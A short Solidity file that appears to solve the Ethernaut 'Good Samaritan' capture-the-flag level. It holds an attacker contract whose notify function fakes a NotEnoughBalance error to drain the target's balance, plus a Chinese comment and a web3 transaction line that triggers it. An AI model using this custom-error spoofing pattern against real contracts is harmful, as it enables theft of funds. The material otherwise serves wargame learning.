// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface GoodSamaritanInterface {
    function requestDonation() external returns(bool);
}

contract GoodSamaritan {
    error NotEnoughBalance();
    function notify(uint256 amount) pure  external{
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
    function getMoney(address addr) public {
        GoodSamaritanInterface(addr).requestDonation();
    }
}


//该关卡首先coin中的isContract函数发送NotEnoughBalance，仅满足try wallet.donate10条件进入catch
//web3.eth.sendTransaction({from:player, to:"0x4461D4e29d3639b50147dac9Be0BcC7d673Ca46B", data:web3.utils.sha3("getMoney(address)").slice(0,10)+"000000000000000000000000" + "041Ba64e09381e56a95dE0980B06b00dd314DbBF"})
